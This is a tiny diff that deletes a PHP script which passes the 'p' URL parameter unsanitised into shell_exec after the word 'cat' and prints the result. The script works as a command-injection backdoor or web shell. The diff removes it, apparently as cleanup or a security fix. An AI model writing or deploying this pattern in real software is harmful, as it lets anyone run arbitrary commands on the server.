@@ -1,5 +1,0 @@
-<?php
-$p = $_GET['p'];
-$o= shell_exec('cat'.$p);
-echo $o;
-?>
